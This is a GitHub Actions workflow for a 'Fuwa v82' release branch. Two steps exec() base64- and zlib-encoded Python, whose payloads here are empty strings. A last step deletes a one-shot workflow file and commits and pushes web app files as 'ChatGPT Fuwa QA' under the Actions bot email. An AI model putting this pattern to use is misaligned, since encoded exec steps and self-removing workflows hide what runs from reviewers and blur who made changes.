name: Fuwa v82 update handoff QA

on:
  push:
    branches: [fuwa-v82-update-handoff-qa]

permissions:
  contents: write

jobs:
  patch-test-and-commit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fuwa-v82-update-handoff-qa
          fetch-depth: 0
      - name: Apply v82 handoff patch
        shell: python
        run: |
          import base64,zlib
          exec(zlib.decompress(base64.b64decode("")).decode())
      - name: Run release QA
        shell: python
        run: |
          import base64,zlib
          exec(zlib.decompress(base64.b64decode("")).decode())
      - name: Commit verified v82 build
        shell: bash
        run: |
          set -euo pipefail
          rm -f .github/workflows/fuwa-v82-one-shot.yml
          git config user.name "ChatGPT Fuwa QA"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add app.js index.html service-worker.js .github/workflows/fuwa-v82-one-shot.yml
          git commit -m "Guarantee Fuwa update handoff and release notes v82"
          git push origin HEAD:fuwa-v82-update-handoff-qa
